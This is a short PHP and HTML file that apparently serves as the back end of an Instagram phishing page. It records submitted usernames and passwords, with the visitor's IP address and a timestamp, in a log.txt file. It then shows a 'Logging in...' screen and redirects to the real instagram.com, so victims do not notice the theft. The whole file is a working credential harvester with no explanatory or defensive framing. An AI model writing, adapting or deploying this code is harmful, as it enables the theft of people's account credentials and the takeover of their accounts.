<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);
    $ip = $_SERVER["REMOTE_ADDR"];
    $timestamp = date("Y-m-d H:i:s");

    $data = "[$timestamp] IP: $ip | Username: $username | Password: $password\n";

    file_put_contents("log.txt", $data, FILE_APPEND);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="2;url=https://instagram.com" />
</head>
<body style="background-color:#000;color:#fff;text-align:center;padding-top:100px;">
    <h2>Logging in...</h2>
</body>
</html>
